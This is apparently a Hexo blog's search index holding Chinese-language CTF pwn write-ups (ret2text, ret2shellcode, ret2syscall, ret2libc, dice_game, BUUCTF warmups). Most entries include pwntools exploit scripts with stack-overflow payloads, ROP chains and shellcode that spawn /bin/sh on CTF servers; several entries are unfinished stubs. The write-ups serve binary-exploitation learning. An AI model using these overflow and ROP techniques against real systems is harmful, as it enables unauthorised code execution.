<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xctf</title>
      <link href="/2022/01/12/dice-game/"/>
      <url>/2022/01/12/dice-game/</url>
      
        <content type="html"><![CDATA[<ol><li><p>dice_game</p><ul><li><p>checksec</p><img src="/2022/01/12/dice-game/checksec.png" alt="image-20220112185425348" style="zoom:80%;"></li></ul></li></ol><ul><li><ul><li><p>扔进ida</p><p>分析程序</p><p><strong>memset()函数</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">void *memset(void *s,int c,unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>作用:</p><p>将指针变量s所指向的前n字节的内存单元用一个”整数”c替换,c是int型.它可以为任何类型的数据进行初始化.</p><p><strong>fflush()函数</strong>: 用于清空缓冲区,如果文件是以写的方式打开的,则把缓冲区内容写入文件.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;int fflush(FILE *stream)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>函数说明:fflush()会强制将缓冲区内的数据写回参数stream指定的文件中.如果stream为null,fflush()会将所有打开文件数据更新.</p><p>fflush(stdin): 刷新缓冲区里面的东西输出到设备上去</p><p>fflush(stdout): 刷新缓冲区把缓冲区里面的东西输出到设备上去</p><p><strong>read()函数</strong>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t read(int fd,void *buf, size_t count);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>函数说明:</p><p>read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中.若参数count为0,则read()不会有作用并返回0,.返回值为实际读取到的字节数,如果返回0表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p></li></ul></li><li><p>本题关键: <strong>重写seed</strong></p></li><li><p><strong>void srand</strong></p><pre class="line-numbers language-none"><code class="language-none">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数int rand(void) //rand函数用来产生随机数,当然是伪随机数.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>seed作用: srand函数的作用是根据参数seed,设置一个随机起始点,而rand函数根据这个起始点,产生随机数序列.默认的随机数种子一样,rand函数所产生的随机序列也一样.因此,为使每次程序运行都能产生不同的随机序列,每次都应一个不同的种子参数.</li><li>因为rand的内部实现是用线性同余法做的,它不是真的随机数,只不过是因为其周期特别长,所以有一定的范围可看成随机的,rang()会返回一随机数值,范围在0至RAND_MAX间.在调用此函数产生随机数前,必须先利用srand()设好随机数种子,如果未设随机数种子,rand()在调用时会自动设随机数种子为1.rand()产生的是假随机数字,每次执行时相同的.若要不同,以不同的值来初始化它.初始化的函数就是srand().</li></ul></li></ul><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from ctypes import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./dice_game")local = 0if local:    r = process("./dice_game")else:    r = remote("111.200.241.244",53285)libc = cdll.LoadLibrary("libc.so.6") res = []def dice_game():    for i in range(50):        rand = libc.rand()        res.append(rand % 6 + 1)    print(res)    dice_game()payload = b'a'*0x40 + p64(0)r.sendlineafter("your name: ",payload)for point in res:    r.sendlineafter("the point(1~6): ",str(point))flag = r.recvline()print(flag)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html#module-ctypes"><code>ctypes</code></a> 导出了 <em>cdll</em> 对象在 Linux 下，必须使用 <em>包含</em> 文件扩展名的文件名来导入共享库。因此不能简单使用对象属性的方式来导入库。因此，可以使用方法 <code>LoadLibrary()</code>，或构造 CDLL 对象来导入库。</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简单随机数绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf</title>
      <link href="/2022/01/12/xctf/"/>
      <url>/2022/01/12/xctf/</url>
      
        <content type="html"><![CDATA[<ol><li><p>dice_game</p><ul><li><p>checksec</p><img src="/2022/01/12/xctf/checksec.png" alt="image-20220112185425348" style="zoom:80%;"></li></ul></li></ol><ul><li><ul><li><p>扔进ida</p></li><li></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf 解题</title>
      <link href="/2022/01/12/buuctf/"/>
      <url>/2022/01/12/buuctf/</url>
      
        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简单wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc3</title>
      <link href="/2022/01/12/ret2libc3/"/>
      <url>/2022/01/12/ret2libc3/</url>
      
        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/12/ret2libc3/checksec.png" alt="image-20220112081658716" style="zoom:80%;"></li><li><p>run</p><img src="/2022/01/12/ret2libc3/run.png" alt="image-20220112081802038" style="zoom:80%;"></li><li><p>ida</p><p>基本利用思路</p><ul><li>泄露_libc_start_main地址</li><li>获取libc版本</li><li>获取system地址与/bin/sh地址</li><li>再次执行源程序</li><li>触发栈溢出执行system(‘/bin/sh’)</li></ul></li><li><p>exp</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc2</title>
      <link href="/2022/01/12/ret2libc2/"/>
      <url>/2022/01/12/ret2libc2/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/12/ret2libc2/checksec.png" alt="image-20220112074054848" style="zoom:80%;"></li><li><p>然后运行程序</p><img src="/2022/01/12/ret2libc2/run.png" alt="image-20220112074208851" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>有system无bin/sh</p></li><li><p>写exp</p>   <pre class="line-numbers language-none"><code class="language-none">1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc2") 4 local = 1 5   6 if local: 7     r = process("./ret2libc2") 8 else: 9     r = remote("")10 gets_plt = 0x0804846011 system_plt = 0x0804849012 system_addr = 0x0804864113 pop_ebx = 0x0804843d14  15 buf2_addr = 0x0804A08016  17 payload = b'a'*112 +p32(gets_plt)+p32(pop_ebx) + p32(buf2_addr)+ p32(system_    plt)+p32(0) + p32(buf2_addr)18  19 r.sendline(payload)20 r.sendline("/bin/sh")21  22 r.interactive()                                                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc1</title>
      <link href="/2022/01/11/ret2libc1/"/>
      <url>/2022/01/11/ret2libc1/</url>
      
        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/11/ret2libc1/checksec.png" alt="image-20220111154452445" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/11/ret2libc1/run.png" alt="image-20220111184726541" style="zoom:80%;"></li><li><p>拖入IDA分析</p><p>通过ALT+T</p><p>可以发现system和bin/sh</p></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> 1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc1") 4   5 local = 1 6   7 if local: 8     r = process("./ret2libc1") 9 else:10     r = remote("")11 bin_sh = 0x0804872012 system_addr = 0x0804861113 system_plt = 0x0804846014 # payload = b'a'*112 + p32(system_addr) + p32(bin_sh)15 payload = flat(['a'*112,p32(system_plt),'b'*4,p32(bin_sh)])16  17 r.sendline(payload)18  19 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscall</title>
      <link href="/2022/01/11/ret2syscall/"/>
      <url>/2022/01/11/ret2syscall/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><p>运行程序</p><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><p>拖入IDA</p><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p> 发现危险函数gets()</p><p>​        找gadgets</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><p>​                bin/sh地址</p><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><p>​            int 0x80地址</p><p>​                                   <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></p><p>​              </p><p>​          </p><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2shellcode</title>
      <link href="/2022/01/10/ret2shellcode/"/>
      <url>/2022/01/10/ret2shellcode/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先,checksec一下</p><img src="/2022/01/10/ret2shellcode/checksec.png" alt="image-20220111075622897" style="zoom:80%;"></li></ul><ul><li><p>运行一下</p><img src="/2022/01/10/ret2shellcode/run.png" alt="image-20220111075809324" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>危险函数strncpy()</p><p>strncpy()用来复制字符串的前n个字符,其原型为:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char * strncpy(char *dest,const char *src,size_t n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>strncpy()会将字符串src的前n个字符拷贝到字符串dest.</p><p>strncpy()不会向dest追加标记’\0’.</p><ul><li><p>计算偏移</p><img src="/2022/01/10/ret2shellcode/offset.png" alt="image-20220111082354654" style="zoom:80%;"></li></ul></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2shellcode") 4 local = 1 5 if local: 6     r = process("./ret2shellcode") 7 else: 8     r = remote("") 9  10 buf2 = 0x0804A08011  12 shellcode = asm(shellcraft.sh())13  14 #payload = b'a'*0x6c +b'a'*4 + p32(buf2)15  16 #r.sendline(payload)17 r.sendline(shellcode.ljust(112,'a')+p32(buf2))18 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ljust()作用:</p><p>返回一个原字符串并左对齐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2022/01/10/ret2text/"/>
      <url>/2022/01/10/ret2text/</url>
      
        <content type="html"><![CDATA[<ul><li><p>首先checksec</p><img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li><li><p>拖入IDA</p><ul><li><p>发现危险函数</p><img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li></ul></li><li><ul><li><p>发现system和bin/sh</p><img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li></ul></li><li><p>找到s相对于ebp的距离0x6c+4</p><img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li><li><p>编写exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                             2 log_level = 'debug'  3 local = 1  4 if local:  5     r = process("./ret2text")  6 else:  7     r = remote("")  8 elf = ELF("./ret2text")  9   10 s = 0x6c + 4 11 system_addr = 0x0804863A 12   13 payload = b'a'*s+p32(system_addr) 14 r.sendline(payload) 15   16 r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defcon-2015-r0pbaby</title>
      <link href="/2022/01/10/defcon-2015-r0pbaby/"/>
      <url>/2022/01/10/defcon-2015-r0pbaby/</url>
      
        <content type="html"><![CDATA[<ul><li>checksec一下</li></ul><img src="/2022/01/10/defcon-2015-r0pbaby/check.png" alt="check" style="zoom:80%;"><ul><li><p>运行</p><img src="/2022/01/10/defcon-2015-r0pbaby/run.png" alt="image-20220110112717649" style="zoom:80%;"><ul><li>功能1,获取libc基址</li><li>功能2,获得函数地址</li><li>功能3,输入值</li></ul></li></ul><ul><li><p>拖入IDA</p><img src="/2022/01/10/defcon-2015-r0pbaby/memcpy.png" alt="image-20220110115718520" style="zoom:80%;"></li></ul><p>​        发现memcpy()函数:复制内存内容(忽略\0)</p><p>​        memcpy()用来复制内存,其原型为:</p><pre><code>   <pre class="line-numbers language-c" data-language="c"><code class="language-c">void * memcpy(void * dest,const void *src,size_t num);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></code></pre><p>​       memcpy()会复制src所指的内存内容的前num个字节到dest所指的内存地址上.</p><p>​        memcpy()并不关心被复制的数据类型,只是逐字节锝进行复制,这给函数的使用带来了很大的灵活性,可以面向任何数据类型进行复制.</p><p>​       需要注意的是:</p><p>​             dest指针要分配足够的空间,也即大于等于num字节的空间.</p><p>​             dest和src所指的内存空间不能重叠</p><p>​       与strcpy()不同的是,memcpy()会复制完整num个字节,不会因为遇到”\0”而结束.</p><ul><li><p>savedregs是一个IDA关键字,保存的堆栈帧指针函数返回地址</p></li><li><p>找gadget</p><img src="/2022/01/10/defcon-2015-r0pbaby/gadget.png" alt="image-20220110122631262" style="zoom:80%;"><ul><li><p>查看本地libc.so</p><img src="/2022/01/10/defcon-2015-r0pbaby/libc.png" alt="image-20220110123659827" style="zoom:80%;"></li></ul><ul><li>找”bin/sh”</li></ul><img src="/2022/01/10/defcon-2015-r0pbaby/bin_sh.png" alt="image-20220110123435108" style="zoom:80%;"></li></ul><ul><li>构造exp</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/30/hello-world/"/>
      <url>/2021/11/30/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/11/30/hello-world/1.png" alt="hello"></p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
